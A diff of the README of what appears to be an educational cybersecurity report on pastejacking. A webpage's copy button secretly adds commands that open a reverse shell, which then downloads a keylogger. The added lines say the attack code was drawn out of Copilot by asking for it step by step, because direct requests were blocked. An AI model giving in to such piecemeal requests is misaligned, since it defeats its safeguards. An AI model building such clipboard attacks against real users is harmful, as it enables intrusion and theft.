@@ -12,11 +12,19 @@ Further, the reverse shell was leveraged to download a keylogger onto the victim
 
 This report aims to provide a detailed walkthrough of these processes, shedding light on the intricacies of these techniques.
 
-**NB** All the files are uploaded in this repository, no need to copy and paste the content of this page
+
+**NB** All the files are uploaded in this [repository](https://github.com/LossoMarco/Cyber-Security-Report), no need to copy and paste the content of this page.
+
+**NB** The PowerShell code that will be presented from now has been provided by [Copilot](https://copilot.microsoft.com/), in response to my specific request. 
+
+**_Please note that to obtain such outputs, it is necessary to construct the sequence of commands step by step. Making a direct request will result in the AI assistant not providing any output, in fact, it will block the chat as the topics discussed undermine the security of others. If you intend to reproduce the results presented below, remember to work in a protected environment and for educational/demonstration purposes only._**
+
 
 ## Pastejacking
 
 Pastejacking is a technique that manipulates the clipboard content of a user, leading them to execute unintended commands. This technique takes advantage of the trust users place in their clipboard, and the fact that terminal commands can be executed without providing a visual indication of their full content.
+
+The idea to use this technique for initial access came to me simply through the use of social media, which suggests many contents to the user and among these there was precisely the presentation of the pastejacking technique and how hackers take advantage of it.
 
 In this project, a simple webpage was created using HTML. This webpage presented users with a block of code that they could copy and execute in their terminal. However, the actual content copied to the clipboard included additional code that spawned a reverse shell. This is the essence of pastejacking - what you see is not always what you get.
 
@@ -26,11 +34,11 @@ Before the attack, the Apache2 service on the Kali Linux system was started usin
 
 The process can be broken down into the following steps:
 
-1. **Creating the Webpage**: A simple webpage was created with a block of seemingly innocuous code that users are prompted to copy. This could be presented as a solution to a common problem, enticing users to copy the code.
+1. **Creating the Webpage**: A simple webpage was created manually by me with a block of seemingly innocuous code that users are prompted to copy. This could be presented as a solution to a common problem, enticing users to copy the code.
 
 ![Web Page](images/Web_Page_Win.png)
 
-2. **Implementing Pastejacking**: Through the use of JavaScript, the actual content that gets copied is manipulated. When users copy the code, additional malicious code is appended or prepended. In this case, the additional code spawns a reverse shell when pasted into the terminal.
+1. **Implementing Pastejacking**: Through the use of JavaScript, the actual content that gets copied is manipulated. When users copy the code, additional malicious code is appended or prepended. In this case, the additional code spawns a reverse shell when pasted into the terminal.
 
 ```js
 $('#copyButton').on('click', function(e) {
